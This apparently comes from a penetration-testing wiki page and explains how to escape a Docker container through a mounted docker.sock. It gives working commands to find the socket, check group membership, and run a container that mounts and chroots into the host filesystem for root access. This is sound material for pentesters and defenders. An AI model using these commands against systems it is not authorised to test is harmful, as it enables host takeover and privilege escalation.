# Exposed Docker Engine: Docker Socket

If somehow you find that the **docker socket is mounted INSIDE the docker container**, you will be able to escape from it. This usually happen in docker containers that, for some reason, need to connect to docker daemon to perform actions.

### Search for the Exposed Socket

Should you land a shell insider a containerised application, either by the Docker command line or, more likely, a compromised application, then you need to find a file named `docker.sock`

```text
find / -name docker.sock 2>/dev/null
```

![](../../../.gitbook/assets/image%20%28135%29.png)

{% hint style="info" %}
 docker.sock is often found in `/run/docker.sock`, though it can occasionally pop up in other places
{% endhint %}

The next step is to confirm whether the user account you have landed can execute docker commands \(as shown above\):

```text
groups
```

If both conditions are met, you can use regular docker commands to communicate with the docker daemon:

{% code title="Docker commands to communicate with the docker daemon" %}
```text
#List images to use one
docker images

#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash
```
{% endcode %}

![root privileges secured on the docker host](../../../.gitbook/assets/image%20%28124%29.png)





